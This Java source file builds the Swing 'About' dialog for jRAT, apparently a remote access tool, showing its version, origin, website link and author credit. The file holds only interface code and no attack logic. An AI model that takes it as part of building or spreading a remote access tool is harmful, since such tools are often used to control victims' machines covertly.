package pro.jrat.ui.frames;

import java.awt.Color;
import java.awt.Dimension;
import java.awt.Font;
import java.awt.Graphics;
import java.awt.Image;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;

import javax.imageio.ImageIO;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.border.EmptyBorder;

import pro.jrat.Constants;
import pro.jrat.Main;
import pro.jrat.common.Version;
import pro.jrat.utils.NetworkUtils;



@SuppressWarnings("serial")
public class FrameAbout extends BaseFrame {
	
	public static Image BACKGROUND;
	
	static {
		try {
			BACKGROUND = ImageIO.read(Main.class.getResource("/files/bg_450x300.png"));
		} catch (Exception ex) {
			ex.printStackTrace();
			BACKGROUND = null;
		}
	}

	private JPanel contentPane;

	public FrameAbout() {
		super();
		setAlwaysOnTop(true);
		setIconImage(Toolkit.getDefaultToolkit().getImage(FrameAbout.class.getResource("/icons/information-button.png")));
		setTitle("About jRAT BETA " + Version.getVersion());
		setResizable(false);
		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
		setBounds(100, 100, 386, 300);
		contentPane = new JPanel() {
			@Override
			public void paintComponent(Graphics g) {
				super.paintComponent(g);
				
				if (BACKGROUND != null) {
					g.drawImage(BACKGROUND, 0, 0, null);
				}
			}
		};
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		setContentPane(contentPane);
		try {
		} catch (Exception e) {
			e.printStackTrace();
		}

		JButton btnClose = new JButton("Close");
		btnClose.setBounds(283, 236, 79, 25);
		btnClose.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				setVisible(false);
				dispose();
			}
		});
		btnClose.setIcon(new ImageIcon(FrameAbout.class.getResource("/icons/delete.png")));
		
		JLabel lblJrat = new JLabel("jRAT " + Version.getVersion());
		lblJrat.setBounds(186, 11, 125, 31);
		lblJrat.setFont(new Font("Tahoma", Font.PLAIN, 25));
		
		JLabel lblPointOfOrigin = new JLabel("Point of origin:");
		lblPointOfOrigin.setBounds(186, 149, 70, 14);
		
		JLabel lblSweden = new JLabel("Sweden");
		lblSweden.setBounds(262, 149, 58, 14);
		lblSweden.setIcon(new ImageIcon(FrameAbout.class.getResource("/flags/se.png")));
		
		JLabel lblWebsite = new JLabel("Website:");
		lblWebsite.setBounds(213, 170, 43, 14);
		
		JLabel lblHttpredpoisncom = new JLabel(Constants.HOST);
		lblHttpredpoisncom.setBounds(262, 169, 94, 16);
		lblHttpredpoisncom.addMouseListener(new MouseAdapter() {
			@Override
			public void mouseClicked(MouseEvent arg0) {
				NetworkUtils.openUrl(Constants.HOST + "");
			}
		});
		lblHttpredpoisncom.setIcon(new ImageIcon(FrameAbout.class.getResource("/icons/url.png")));
		lblHttpredpoisncom.setForeground(Color.BLUE);
		
		JLabel lblWrittenBy = new JLabel("Written by:");
		lblWrittenBy.setBounds(201, 192, 55, 14);
		
		JLabel lblRedpoisn = new JLabel("redpois0n (.com)");
		lblRedpoisn.setBounds(262, 191, 101, 16);
		lblRedpoisn.addMouseListener(new MouseAdapter() {
			@Override
			public void mouseClicked(MouseEvent arg0) {
				NetworkUtils.openUrl("http://redpois0n.com");
			}
		});
		lblRedpoisn.setIcon(new ImageIcon(FrameAbout.class.getResource("/icons/action_disconnect.png")));
		lblRedpoisn.setForeground(Color.RED);

		contentPane.setLayout(null);
		contentPane.add(btnClose);
		contentPane.add(lblJrat);
		contentPane.add(lblWebsite);
		contentPane.add(lblPointOfOrigin);
		contentPane.add(lblWrittenBy);
		contentPane.add(lblRedpoisn);
		contentPane.add(lblHttpredpoisncom);
		contentPane.add(lblSweden);

		Dimension dim = Toolkit.getDefaultToolkit().getScreenSize();
		int w = getSize().width;
		int h = getSize().height;
		int x = (dim.width - w) / 2;
		int y = (dim.height - h) / 2;
		setLocation(x, y);
	}
}
